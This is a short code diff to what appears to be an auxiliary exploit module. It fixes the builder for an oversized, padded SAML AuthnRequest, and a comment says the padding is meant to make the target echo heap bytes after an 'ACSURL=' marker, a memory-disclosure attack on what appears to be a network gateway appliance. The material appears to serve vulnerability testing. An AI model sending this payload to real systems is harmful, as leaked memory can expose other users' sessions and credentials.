@@ -53,14 +53,16 @@ class Module(Auxiliary, Http_client):
 
     @staticmethod
     def _build_saml_request(padding_size: int) -> str:
+        # Oversized AuthnRequest: padding inflates the parsed structure so
+        # NSC_TASS may echo heap bytes after the ACSURL= marker.
         return (
             "<samlp:AuthnRequest "
             + (" " * padding_size)
-            + f'''id="{padding_size}"
-<saml2:issuer>watchTowr</saml2:issuer>
-</samlp:AuthnRequest>
-Version="2.0"
-AssertionConsumerServiceURL=""'
+            + f'id="{padding_size}" '
+            'Version="2.0" '
+            'AssertionConsumerServiceURL="">'
+            "<saml2:issuer>watchTowr</saml2:issuer>"
+            "</samlp:AuthnRequest>"
         )
 
     @staticmethod
